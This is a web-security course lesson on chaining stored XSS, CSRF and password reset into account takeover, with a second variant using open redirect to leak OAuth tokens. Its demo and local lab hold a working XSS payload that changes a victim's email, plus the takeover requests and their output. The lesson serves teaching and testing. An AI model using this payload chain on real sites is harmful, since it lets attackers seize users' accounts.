---
title: "Lesson 10.2: Client-side chaining from XSS to account takeover"
image:
  path: /assets/img/covers/web-10-2-client-side-chain-xss-account-takeover.webp
  alt: "Client-side chaining from XSS to account takeover"
date: 2024-06-15 18:10:00 +0700
categories: ["Web Security", "Web · Chaining"]
tags: [web, chaining, account-takeover]
render_with_liquid: false
---

A server-side chain (Lesson 10.1) runs directly on the server. A client-side chain is different: the attacker does not hit the server head-on, but uses the victim's browser as the tool. The victim is logged in, their browser holds the cookie or token, and the attacker finds a way to make that browser act on their behalf. This lesson chains client-side flaws (stored XSS, CSRF, open redirect, token leak) into an account takeover, proving the two main links on a real lab.

![Client-side chaining from XSS to account takeover](/assets/img/web/web-10-2-client-side-chain-xss-account-takeover.svg)
_Stored XSS runs in the victim's logged-in browser, fires a CSRF request to change the email, and the password reset completes the takeover._

Level: advanced, about 50 minutes. Prerequisites: Lesson 10.1 (Recon to RCE), Lesson 3.2 (Stored XSS), Lesson 5.3 (CSRF), Lesson 4.4 (OAuth). Tools: a browser with DevTools, Burp Suite, Python requests, a request-catching server (interactsh/webhook).

## Goals

After this lesson you understand how a client-side chain differs from a server-side one in that its engine is the victim's browser, you know two common chain variants (XSS to CSRF to account takeover, and open redirect to OAuth token leak), you can tell which links can be proven server-side and which need a browser, and you can prove stored XSS and CSRF on a real lab and see how they combine into a takeover.

## Theory

A server-side chain (Lesson 10.1) runs directly on the server. A **client-side** chain is different: the attacker does not attack the server head-on, but **uses the victim's browser** as the tool. The victim is logged in, their browser holds the cookie/token, and the attacker finds a way to make that browser perform an action for them.

Two common variants:

**Variant A: Stored XSS to CSRF to Account Takeover.**

- **Stored XSS**: the attacker inserts a script into content the server stores (a comment, a display name, a description). When the victim views that page, the script runs in the victim's session.
- That script calls an endpoint that changes account state (change email, change phone number). If the endpoint lacks **CSRF** protection, the request carrying the victim's cookie succeeds.
- Once the email is changed to the attacker's, the attacker triggers a **password reset**. The reset link goes to their email. The account is taken over (account takeover, ATO).

Here stored XSS usually defeats the CSRF protection on its own (because the script runs same-origin and can read the CSRF token). But if the endpoint also lacks both the token and `SameSite`, it is even easier.

**Variant B: Open redirect to OAuth token leak.**

- **Open redirect**: an endpoint takes a `redirect_uri`/`next`/`url` parameter and redirects to it without checking, allowing a redirect to any domain.
- In the OAuth implicit flow, the token is returned via the fragment of the `redirect_uri`. If the `redirect_uri` is not matched strictly against an allowlist, the attacker points it at their own page, the victim clicks "agree", and the token flies to the attacker's page.
- With the token, the attacker can access the victim's resources.

The key point about proof: some links can be proven directly server-side (does the XSS payload get stored and returned intact, does the CSRF endpoint change state with only a cookie, does the OAuth endpoint accept an unfamiliar `redirect_uri`). The link "the victim's browser runs the script" needs a browser environment to see with your own eyes. In the lab and the report, we prove the server-side links solidly, then describe the browser part that joins them.

## Demo

The lab in `labs/10.2/` sets up an app following variant A. We prove the two main links for real.

Link 1, stored XSS. Post a comment containing a script, then load `/feed` to see whether it is escaped:

```text
POST /comment  {"author":"attacker","text":"<script>fetch('/account/email',{method:'POST',
  headers:{'Content-Type':'application/json'},credentials:'include',
  body:JSON.stringify({email:'attacker@evil.local'})});</script>"}

GET /feed
-> <div class='c'><b>attacker</b>: <script>fetch('/account/email', ... )</script></div>
```

The script is returned intact, not escaped. That means when the victim opens `/feed`, the `fetch` will run in their session. Link 2, CSRF. Simulate exactly what that script does: send the email-change request with only the session cookie, no CSRF token:

```text
(log in as the victim -> have the session cookie)
admin email BEFORE: admin@corp.local

POST /account/email  {"email":"attacker@evil.local"}   (cookie only, no token)
-> HTTP 200 {"ok":true,"email":"attacker@evil.local"}
```

The email is changed with no token at all. Putting it together: the victim views the feed (link 1 triggers link 2 in their browser), and the account email is changed to the attacker's. Link 3, account takeover via password reset:

```text
POST /account/forgot {"username":"admin"}
-> reset token gui toi: attacker@evil.local   (email da bi doi)

POST /account/reset {"token":"rst-admin-7f3a","new_password":"PwnedByAttacker!"}
-> {"ok":true,"message":"password cua admin da bi doi",
    "flag":"FLAG{10.2_stored_xss_csrf_account_takeover}"}
```

The first two links are proven solidly server-side. The link "the victim's browser runs the script on /feed" is the part that needs a browser, which we describe clearly: the payload already sits in the returned HTML, waiting for the victim to visit.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 10.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/10.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/10.2/app.py" download><i class="fa-solid fa-file-code"></i>app.py</a>
<a class="lab-file" href="/assets/labs-web/10.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
</div>
</div>

- Vulnerable app: `labs/10.2/` (Flask, binds `127.0.0.1:8077`, runs locally per the lab README).
- Tasks:
  1. Post a comment containing a script, and confirm `/feed` returns the script un-escaped (stored XSS).
  2. Prove `/account/email` changes the email with only a cookie, no CSRF token.
  3. Use `/account/forgot` and `/account/reset` to complete the takeover.
- Hint: to see the XSS link actually run in a browser, open `/feed` in a browser after logging in on the same origin, and watch the Network tab show the `/account/email` request fire on its own.
- Solution: `exploit.py` and `transcript.txt` in `labs/10.2/`.

## Common pitfalls

- Underrating stored XSS because "it only pops an alert". The real impact is account takeover, taking over an admin session.
- Thinking a CSRF token makes you immune, forgetting that same-origin stored XSS can read that token.
- Leaving a cookie at `SameSite=None` unnecessarily, opening the way for cross-site CSRF.
- Password reset sends the link to the account's current email, so changing the email means taking over the account. This is the link people often overlook.

## Further reading

- PortSwigger Web Security Academy: XSS, CSRF, OAuth authentication, DOM-based vulnerabilities.
- Google Bughunters and "XSS to account takeover" writeups on HackerOne.
- Lesson 3.5 (exploiting XSS), Lesson 5.3 (CSRF), Lesson 4.4 (OAuth) in this series to review each link.

## Key takeaways

- A client-side chain borrows the victim's browser as its engine, so always assume the victim is logged in.
- Stored XSS is the strongest client-side link: it runs same-origin, so it gets past even a CSRF token.
- State-changing endpoints (email, password, phone number) are the target; check the CSRF token and `SameSite`.
- Open redirect is rarely dangerous alone, but combined with OAuth/token it is serious.
- When reporting, separate clearly which links are proven (a working PoC) and which need a browser.
